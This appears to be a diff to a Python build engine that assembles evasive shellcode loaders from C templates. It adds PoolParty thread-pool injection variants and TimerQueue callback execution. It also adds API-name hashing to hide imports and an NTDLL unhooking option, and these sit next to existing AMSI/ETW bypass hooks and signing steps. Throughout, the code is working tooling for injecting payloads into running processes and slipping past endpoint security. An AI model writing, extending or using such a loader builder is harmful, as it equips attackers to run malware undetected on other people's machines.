@@ -69,8 +69,8 @@ class BuildEngine:
             with open(config.payload_path, "rb") as f:
                 payload = f.read()
 
-            # Set target process (APC only)
-            if config.inject_method == "apc":
+            # Set target process (APC + PoolParty methods open an existing process by name)
+            if config.inject_method in ("apc", "tp_direct", "wf_overwrite"):
                 self._set_target_process(dst, config)
 
             # Set injection method (must happen before hash replacement
@@ -109,6 +109,9 @@ class BuildEngine:
             # Trampoline hooks (AMSI / ETW bypass)
             self._handle_trampoline_bypass(dst, config)
 
+            # NTDLL unhooking
+            self._handle_unhook(dst, config)
+
             # Compile and sign
             return self._compile_and_sign(dst, config)
 
@@ -136,8 +139,8 @@ class BuildEngine:
 
             payload_hex = ', '.join(f"0x{b:02x}" for b in raw_payload)
 
-            # Set target process (APC only)
-            if config.inject_method == "apc":
+            # Set target process (APC + PoolParty methods open an existing process by name)
+            if config.inject_method in ("apc", "tp_direct", "wf_overwrite"):
                 self._set_target_process(dst, config)
 
             # Set injection method (must happen before hash replacement
@@ -175,6 +178,9 @@ class BuildEngine:
 
             # Trampoline hooks (AMSI / ETW bypass)
             self._handle_trampoline_bypass(dst, config)
+
+            # NTDLL unhooking
+            self._handle_unhook(dst, config)
 
             # Compile and sign
             return self._compile_and_sign(dst, config)
@@ -222,6 +228,12 @@ class BuildEngine:
             "#-GETTICKCOUNT64_VALUE-#": Hasher.Hasher("GetTickCount64", seed, initial_hash),
             "#-GLOBALMEMORYSTATUSEX_VALUE-#": Hasher.Hasher("GlobalMemoryStatusEx", seed, initial_hash),
             "#-GETSYSTEMINFO_VALUE-#": Hasher.Hasher("GetSystemInfo", seed, initial_hash),
+            # poolparty.c API hashing
+            "#-NTQIP_VALUE-#": Hasher.Hasher("NtQueryInformationProcess", seed, initial_hash),
+            "#-NTQO_VALUE-#": Hasher.Hasher("NtQueryObject", seed, initial_hash),
+            "#-NTQIWF_VALUE-#": Hasher.Hasher("NtQueryInformationWorkerFactory", seed, initial_hash),
+            "#-NTSIWF_VALUE-#": Hasher.Hasher("NtSetInformationWorkerFactory", seed, initial_hash),
+            "#-ZSETIO_VALUE-#": Hasher.Hasher("ZwSetIoCompletion", seed, initial_hash),
             # trampoline.c API hashing
             "#-AMSI_VALUE-#": Hasher.Hasher("AMSI.DLL", seed, initial_hash),
             "#-AMSISCANBUFFER_VALUE-#": Hasher.Hasher("AmsiScanBuffer", seed, initial_hash),
@@ -313,7 +325,7 @@ class BuildEngine:
 \t// Stopping the debugging of the process, which launches the payload
 \tcDAPSu(dwProcessId);
 \t//printf("[+] Payload executed!\\n");'''
-        elif config.inject_method == "callback":
+        elif config.inject_method == "copyfile2":
             injection_code = '''//printf("[i] Executing shellcode via CopyFile2 callback..\\n");
 \t// Doing Callback Injection
 \tif (!CallbackInjection(pClearText, sEncPayload, &pProcess)) {
@@ -323,6 +335,33 @@ class BuildEngine:
 \t
 \t//printf("[+] Payload executed via callback!\\n");'''
 
+        elif config.inject_method == "tp_direct":
+            injection_code = '''//printf("[i] Executing shellcode via PoolParty TP_DIRECT..\\n");
+\t// PoolParty Variant 7: TP_DIRECT insertion via IoCompletion queue
+\tif (!PoolPartyTpDirect(pClearText, sEncPayload, TARGET_PROCESS)) {
+
+\t\treturn -1;
+\t}
+\t//printf("[+] Shellcode queued via TP_DIRECT!\\n");'''
+
+        elif config.inject_method == "wf_overwrite":
+            injection_code = '''//printf("[i] Executing shellcode via PoolParty WorkerFactory overwrite..\\n");
+\t// PoolParty Variant 1: WorkerFactory start-routine overwrite
+\tif (!PoolPartyWfOverwrite(pClearText, sEncPayload, TARGET_PROCESS)) {
+
+\t\treturn -1;
+\t}
+\t//printf("[+] Shellcode injected via WorkerFactory overwrite!\\n");'''
+
+        elif config.inject_method == "timerqueue":
+            injection_code = '''//printf("[i] Executing shellcode via TimerQueue callback..\\n");
+\t// TimerQueue callback self-injection
+\tif (!TimerQueueInject(pClearText, sEncPayload)) {
+
+\t\treturn -1;
+\t}
+\t//printf("[+] Shellcode dispatched via TimerQueue callback!\\n");'''
+
         target_file = "main.c" if config.format != "DLL" else "main_dll.c"
         filepath = os.path.join(dst, target_file)
 
@@ -330,9 +369,9 @@ class BuildEngine:
             data = f.read()
         data = data.replace("// #-INJECTION_METHOD_PLACEHOLDER-#", injection_code)
 
-        # CopyFile2 injection doesn't need a suspended process —
+        # CopyFile2 and PoolParty injections find an existing process — no suspended process needed
         # comment out CreateSuspendedProcess and its surrounding sleeps/prints
-        if config.inject_method == "copyfile2":
+        if config.inject_method in ("copyfile2", "tp_direct", "wf_overwrite", "timerqueue"):
             lines = data.splitlines(keepends=True)
             in_csp_block = False
             for i in range(len(lines)):
@@ -943,6 +982,41 @@ class BuildEngine:
             with open(fpath, "r") as f:
                 data = f.read()
             data = data.replace("// #-TRAMPOLINE_CALL-#", call)
+            with open(fpath, "w") as f:
+                f.write(data)
+
+    def _handle_unhook(self, dst: str, config: "BuildConfig"):
+        """Optionally strip the NTDLL unhooking block from main*.c.
+
+        When unhook is True (default), the MapNtdll()/Unhook() block is
+        left in place.  When False it is replaced with a comment so the
+        loader skips unhooking entirely (smaller surface, but no hook
+        removal).
+        """
+        if getattr(config, 'unhook', True):
+            self._log("NTDLL unhooking enabled.", "info")
+            return
+
+        self._log("NTDLL unhooking disabled.", "info")
+
+        old_block = (
+            "\t//printf(\"[+] Un-hooking Ntdll \\n\");\n"
+            "\tLPVOID nt = MapNtdll();\n"
+            "\tif (!nt) \n"
+            "\t\treturn -1;\n"
+            "\n"
+            "\tif (!Unhook(nt)) \n"
+            "\t\treturn -1;\n"
+        )
+        new_block = "\t/* NTDLL unhooking disabled */\n"
+
+        for fname in ("main.c", "main_dll.c"):
+            fpath = os.path.join(dst, fname)
+            if not os.path.exists(fpath):
+                continue
+            with open(fpath, "r") as f:
+                data = f.read()
+            data = data.replace(old_block, new_block)
             with open(fpath, "w") as f:
                 f.write(data)
 
